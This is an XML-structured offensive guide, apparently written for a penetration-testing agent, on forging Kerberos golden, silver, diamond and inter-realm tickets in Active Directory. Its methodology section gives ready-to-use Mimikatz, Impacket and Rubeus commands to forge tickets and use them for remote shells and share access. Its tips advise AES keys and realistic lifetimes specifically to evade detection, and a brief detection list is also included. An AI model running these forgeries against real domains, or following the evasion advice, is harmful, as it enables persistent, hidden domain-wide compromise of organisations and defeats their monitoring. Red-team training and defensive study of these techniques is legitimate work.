<vulnerability_guide>
  <title>GOLDEN AND SILVER TICKET ATTACKS</title>

  <critical>Kerberos ticket forgery attacks allow attackers with domain admin or service account credentials to create persistent, virtually undetectable access to Active Directory environments. Golden tickets grant domain-wide access, while silver tickets target specific services.</critical>

  <scope>
    - Golden ticket creation and usage
    - Silver ticket attacks against services
    - Diamond ticket attacks (newer technique)
    - Detection and persistence considerations
    - Ticket lifecycle and renewal
  </scope>

  <methodology>
    1. PREREQUISITE GATHERING
       - For Golden Ticket: Obtain krbtgt NTLM hash (requires domain admin)
       - For Silver Ticket: Obtain service account NTLM hash
       - Gather domain SID
       - Identify target user to impersonate

    2. GOLDEN TICKET CREATION
       {% raw %}
       # Using Mimikatz
       mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /id:500 /ptt

       # Using Impacket
       ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain domain.local Administrator

       # Using Rubeus
       Rubeus.exe golden /rc4:<krbtgt_hash> /user:Administrator /domain:domain.local /sid:S-1-5-21-... /ptt
       {% endraw %}

    3. SILVER TICKET CREATION
       {% raw %}
       # Target specific service (e.g., CIFS for file shares)
       mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:<service_hash> /ptt

       # Using Impacket for SQL Server
       ticketer.py -nthash <sql_svc_hash> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/sql.domain.local:1433 Administrator
       {% endraw %}

    4. TICKET USAGE
       {% raw %}
       # Pass the ticket
       export KRB5CCNAME=/path/to/ticket.ccache

       # Access resources
       psexec.py -k -no-pass domain.local/Administrator@dc01.domain.local
       smbclient.py -k -no-pass //server.domain.local/C$
       {% endraw %}
  </methodology>

  <advanced_techniques>
    <diamond_ticket>
      Modifies legitimate TGT instead of forging from scratch - harder to detect
      {% raw %}
      Rubeus.exe diamond /krbkey:<aes256_key> /user:user /password:pass /enctype:aes /domain:domain.local /dc:dc01.domain.local /ptt
      {% endraw %}
    </diamond_ticket>

    <sapphire_ticket>
      Uses S4U2Self to obtain legitimate PAC - evades PAC validation
      Requires control of a computer account
    </sapphire_ticket>

    <inter_realm_golden>
      Golden ticket with Enterprise Admin SID for forest-wide access
      Add Enterprise Admins SID: S-1-5-21-<root_domain_sid>-519
    </inter_realm_golden>

    <persistence>
      - Golden tickets valid for 10 years by default
      - Survives password resets (except krbtgt reset)
      - No logon events generated for ticket creation
      - Consider krbtgt key rotation schedule
    </persistence>
  </advanced_techniques>

  <detection>
    - Event ID 4769 with encryption type 0x17 (RC4) when AES is expected
    - TGS requests without prior TGT request (AS-REQ)
    - Tickets with abnormally long lifetimes
    - User accounts accessing resources they don't normally access
    - Silver tickets: Service tickets without corresponding TGT
  </detection>

  <validation>
    - Successfully access domain controller with forged ticket
    - Verify ticket works across multiple domain resources
    - Confirm ticket survives password changes (golden)
    - Test persistence after system reboots
  </validation>

  <pro_tips>
    - Use AES256 keys instead of RC4 to avoid detection
    - Match ticket encryption to domain policy
    - Set realistic ticket lifetimes
    - Golden ticket requires krbtgt hash; silver only needs service hash
    - Reset krbtgt twice to invalidate golden tickets (wait for replication)
  </pro_tips>

  <remember>Golden tickets are the "keys to the kingdom" - they provide persistent domain access until krbtgt is reset twice. Silver tickets are stealthier but limited to specific services. Always use AES keys when available to avoid RC4 detection signatures.</remember>
</vulnerability_guide>
